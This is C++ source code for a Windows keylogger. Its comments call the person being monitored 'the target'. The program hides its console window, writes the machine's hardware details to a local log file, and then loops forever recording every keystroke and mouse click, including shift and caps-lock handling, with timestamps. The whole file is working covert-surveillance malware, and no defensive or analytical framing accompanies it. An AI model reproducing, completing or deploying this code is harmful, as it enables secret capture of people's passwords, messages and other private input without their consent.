#include <iostream>
#include <Windows.h>
#include <fstream>
#include <ctime>
#include <gdiplus.h>
#pragma comment(lib, "user32.lib")
#pragma warning(disable : 4996)

using namespace std;

void getSystemInformation();
int save(int _key, char const* file);
void initKeyLogger();
int shiftPressed = 0;
int shiftState = 0;
int capitalState = 0;
const int specialCharacters[] = { 41,33,64,35,36,37,94,38,42,40 };
bool newLine = true;

int main()
{

    ShowWindow(GetConsoleWindow(), SW_HIDE); //HIDING THE WINDOW FROM THE TARGET
    getSystemInformation();
    initKeyLogger();
}

void getSystemInformation()
{
    FILE* LOG_FILE = fopen("log.txt", "w"); //RESETTING THE LOG FILE EVERYTIME THE PROGRAM RUNS

    SYSTEM_INFO siSysInfo;  // Copy the hardware information to the SYSTEM_INFO structure. 
    GetSystemInfo(&siSysInfo);
    time_t tt;
    struct tm* ti;
    time(&tt);
    ti = localtime(&tt);

    // Display the contents of the SYSTEM_INFO structure. 
    fprintf(LOG_FILE, "KeyLogger Initializing...\n");
    fprintf(LOG_FILE, "KeyLogger Initialized at : %s\n", asctime(ti));
    fprintf(LOG_FILE, "Hardware information: \n");
    fprintf(LOG_FILE, "  OEM ID: %u\n", siSysInfo.dwOemId);
    fprintf(LOG_FILE, "  Number of processors: %u\n", siSysInfo.dwNumberOfProcessors);
    fprintf(LOG_FILE, "  Page size: %u\n", siSysInfo.dwPageSize);
    fprintf(LOG_FILE, "  Processor type: %u\n", siSysInfo.dwProcessorType);
    fprintf(LOG_FILE, "  Minimum application address: %lx\n",
        siSysInfo.lpMinimumApplicationAddress);
    fprintf(LOG_FILE, "  Maximum application address: %lx\n",
        siSysInfo.lpMaximumApplicationAddress);
    fprintf(LOG_FILE, "  Active processor mask: %u\n\n",
        siSysInfo.dwActiveProcessorMask);

    fprintf(LOG_FILE, "Keylogs:\n");
    fclose(LOG_FILE);

}

void initKeyLogger()
{
    char i;
    while (true)
    {
        for(i = 8; i <= 255; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                capitalState = GetKeyState(VK_CAPITAL); //STORING STATUS OF CAPS KEY
                shiftPressed = GetKeyState(VK_LSHIFT); //STORING STATUS OF SHIFT KEY
                if (shiftPressed == -127 || shiftPressed == -128) shiftState = 1;
                else shiftState = 0;
                if ((capitalState && !shiftState && i >= 65 && i <= 90) || (!capitalState && shiftState && i >= 65 && i <= 90)) save(i, "log.txt");
                else if (i >= 65 && i <= 90) save(i + 32, "log.txt");
                else if (i >= 48 && i <= 57 && shiftState) save(specialCharacters[i - 48], "log.txt");
                else save(i, "log.txt");
            }
        }
    }
}

int save(int _key, char const* file) // FUNCTION THAT TAKES THE KEYSTROKE AND FILE POINTER AS ARGUMENT USED TO LOG EACH KEYSTROKE TO THE FILE
{
    FILE* LOG_FILE = fopen(file, "a+");
    if (newLine) //If the target has pressed ENTER/RETURN previously then it must be new line so we will display the date and time.
    {
        newLine = false;
        time_t tt;
        struct tm* ti;
        time(&tt);
        ti = localtime(&tt);
        cout << asctime(ti);
        fprintf(LOG_FILE, "%s", asctime(ti));
    }

    if (_key == VK_SHIFT) {}
    else if (_key == VK_BACK)
    {
        cout << "[BACK]";
        fprintf(LOG_FILE, "[BACKSPACE]");
    }
    else if (_key == VK_RETURN)
    {
        cout << "[RETURN]" << endl;
        fprintf(LOG_FILE, "[RETURN]\n");
        newLine = 1;
    }
    else if (_key == VK_ESCAPE)
    {
        cout << "[ESCAPE]";
        fprintf(LOG_FILE, "[EXCAPE]");
    }
    else if (_key == VK_LBUTTON)
    {
        cout << "[LEFTMOUSEBUTTON]";
        fprintf(LOG_FILE, "[LEFTCLICK]");
    }
    else if (_key == VK_RBUTTON)
    {
        cout << "[RIGHTMOUSEBUTTON]";
        fprintf(LOG_FILE, "[RIGHTCLICK]");
    }
    else if (_key == VK_CAPITAL) {}
    else
    {
        printf("%s", &_key);
        fprintf(LOG_FILE, "%s", &_key);
    }

    fclose(LOG_FILE);
    return 0;

}